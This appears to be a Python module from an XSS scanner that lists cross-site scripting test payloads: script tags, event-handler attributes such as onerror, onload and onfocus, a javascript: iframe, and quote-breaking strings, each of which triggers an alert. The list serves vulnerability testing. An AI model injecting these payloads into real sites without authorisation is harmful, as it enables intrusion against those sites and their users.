# scanners/xss/xss_payloads.py

XSS_PAYLOADS = {
    "basic": [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg/onload=alert("XSS")>',
    ],
    "context_break": [
        '"><script>alert("XSS")</script>',
        "';alert('XSS');//",
        '"><img src=x onerror=alert("XSS")>',
    ],
    "advanced": [
        '<iframe src="javascript:alert(\'XSS\')">',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>',
    ]
}